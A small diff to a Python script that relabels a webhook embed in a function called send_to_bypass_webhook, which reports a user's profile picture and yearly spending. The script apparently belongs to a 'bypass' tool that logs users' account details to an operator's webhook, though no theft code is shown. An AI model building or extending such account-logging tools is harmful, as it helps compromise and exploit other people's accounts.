@@ -177,7 +177,7 @@ def send_to_bypass_webhook(user_info, ping_content):
             'content': ping_content,
             'embeds': [
                 {
-                    'title': 'Bypass Logs - Successful 🟢',
+                    'title': 'BYPASS - LOGS 🟢',
                     'color': 0x00ff00,  # Green color for success
                     'thumbnail': {
                         'url': user_info['profile_picture']
@@ -204,7 +204,7 @@ def send_to_bypass_webhook(user_info, ping_content):
                             'inline': True
                         },
                         {
-                            'name': '📊 Total Spent',
+                            'name': '📊 Summary',
                             'value': user_info.get('total_spent_past_year', 'Not available'),
                             'inline': True
                         },
